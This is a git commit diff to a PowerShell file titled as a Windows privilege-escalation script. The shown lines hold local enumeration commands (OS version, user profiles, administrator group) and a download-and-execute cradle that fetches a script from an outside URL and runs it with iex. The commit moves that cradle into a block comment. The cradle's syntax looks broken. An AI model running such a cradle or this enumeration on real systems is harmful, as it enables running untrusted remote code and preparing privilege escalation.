74014756ebd726e74e3aacec9d1d39f16b19be79
droppedpackets <56236210+dr0pp3dpack3ts@users.noreply.github.com>
2021-08-20 13:15:00 -0700

    Update # A Windows Privilege Escalation!.ps1

--- # A Windows Privilege Escalation!.ps1
+++ # A Windows Privilege Escalation!.ps1
@@ -8,7 +8,7 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" ### OS name and version
 Get-ChildItem C:\Users -Force | Select-Object Name ### Lists all user profiles on machine.
 net localgroup administrators ### Lists all administrator groups
 
-
-<< $url = ‘https://www.justaprank.com/scripts/script1.ps1′
+# Loads PS Script into a variable (Will use later...)
+<# $url = ‘https://www.justaprank.com/scripts/script1.ps1′
 iex ((New ObjectNet.WebClient).DownloadString($url))
-#
+#>
